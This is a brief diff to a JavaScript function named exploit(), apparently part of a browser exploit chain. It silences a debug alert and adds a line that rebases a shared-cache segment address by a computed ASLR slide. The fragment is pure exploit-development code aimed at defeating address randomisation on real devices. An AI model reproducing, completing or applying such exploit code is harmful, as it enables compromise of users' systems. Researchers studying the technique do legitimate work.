@@ -635,7 +635,7 @@ function exploit(){
             if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
             {
                 base_seg = seg;
-                alert(base_seg.addr)
+                //alert(base_seg.addr)
             }
         }
         if(base_seg == null)
@@ -643,6 +643,7 @@ function exploit(){
             fail("base_seg");
         }
         var cache_slide = Sub(hdr, base_seg.addr);
+        base_seg = Add(base_seg, cache_slide)
         for(var i = 0; i < nsegs; ++i)
         {
             segs[i].addr = Add(segs[i].addr, cache_slide);
